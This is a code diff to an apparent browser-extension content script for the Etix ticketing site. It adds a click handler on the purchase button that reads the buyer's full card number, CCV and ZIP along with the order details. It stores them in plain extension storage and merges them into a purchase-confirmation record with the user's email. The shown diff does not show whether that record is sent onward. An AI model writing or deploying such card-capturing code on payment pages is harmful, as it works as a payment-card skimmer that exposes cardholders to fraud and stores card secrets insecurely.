@@ -1,7 +1,44 @@
 $(window).on("load", function () {
   console.log("Hi, I am Etix.js on Window load :)");
+});
+$(document).ready(async function () {
+  console.log("Hi, I am Etix.js on Document ready :)");
   if (window.location.pathname === "/ticket/mvc/legacyOnlineSale/performance/sale/deliverOrder") {
     scrape_confirmation_data_etix();
+  }
+  if (window.location.pathname === "/ticket/mvc/legacyOnlineSale/performance/sale/displayPrice") {
+    // purchase button
+    $("#invoice-submit-btn").on("click", async function () {
+      const tickets_table = {
+        total: null,
+        zip: null,
+        ccv: null,
+        card: null,
+        tickets: [],
+      };
+
+      $("#miscTicketsList")
+        .children()
+        .each(function (index_tr, tr) {
+          const tr_data = {};
+          $(this)
+            .children()
+            .each(function (index_td, td) {
+              tr_data[$(this).attr("data-title")] = $(this).text().replace(/[\n]+/g, "").trim();
+            });
+          tickets_table.tickets.push(tr_data);
+        })
+        .promise()
+        .done(async function () {
+          tickets_table.total = $("#order-total-price").text();
+          tickets_table.zip = $("#zip").val();
+          tickets_table.ccv = $("#ccv").val();
+          tickets_table.card = $("#cc-number").val();
+          await chrome.storage.local.set({ ["tickets_table"]: tickets_table });
+          let result = await chrome.storage.local.get(["tickets_table"]);
+          console.log("Etix Tickets Table", result);
+        });
+    });
   }
 });
 
@@ -15,14 +52,16 @@ chrome.runtime.onMessage.addListener(async function (request, sender, sendRespon
 async function scrape_confirmation_data_etix() {
   try {
     // add  email
+    await chrome.runtime.sendMessage({ cmd: "get_email", content: "" });
     let result = await chrome.storage.local.get(["email"]);
+    let result_tickets = await await chrome.storage.local.get(["tickets_table"]);
 
     // build confirmation res
     const confirmation_res_etix = {
       id: Math.random().toString().substring(2, 7) + Math.random().toString().substring(2, 7) + Math.random().toString().substring(2, 7) + Math.random().toString().substring(2, 7),
       created: new Date(),
       type: "purchase_confirmation_etix",
-      data: { order: $("#order_id").text(), paid: $("#orderId > div > div > div.col-12.col-lg-6.text-lg-right > strong").text(), event_date: $("#order-details > div > div > div:nth-child(4)").text(), address: $("#order-details > div > div > div:nth-child(6)").text(), title: $("#order-details > div > div > div.col-12.col-lg-8 > h2 > strong > a").text(), link: $("#order-details > div > div > div.col-12.col-lg-8 > h2 > strong > a").attr("href") },
+      data: { tickets: result_tickets["tickets_table"], order: $("#order_id").text(), paid: $("#orderId > div > div > div.col-12.col-lg-6.text-lg-right > strong").text(), event_date: $("#order-details > div > div > div:nth-child(4)").text(), address: $("#order-details > div > div > div:nth-child(6)").text(), title: $("#order-details > div > div > div.col-12.col-lg-8 > h2 > strong > a").text(), link: $("#order-details > div > div > div.col-12.col-lg-8 > h2 > strong > a").attr("href") },
       email: result["email"],
     };
     console.log("confirmation_res_etix", confirmation_res_etix);
